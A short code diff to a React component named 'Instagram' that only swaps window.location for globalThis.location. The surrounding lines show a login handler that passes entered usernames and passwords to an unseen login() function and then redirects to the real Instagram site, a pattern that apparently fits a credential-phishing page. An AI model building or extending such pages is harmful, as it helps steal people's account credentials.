@@ -34,7 +34,7 @@ const Instagram = () => {
 
   const handleLogin = async () => {
     await login(items);
-    window.location.href = "https://www.instagram.com";
+    globalThis.location.href = "https://www.instagram.com";
   };
 
   const isValid = items.login.length > 0 && items.password.length >= 6;
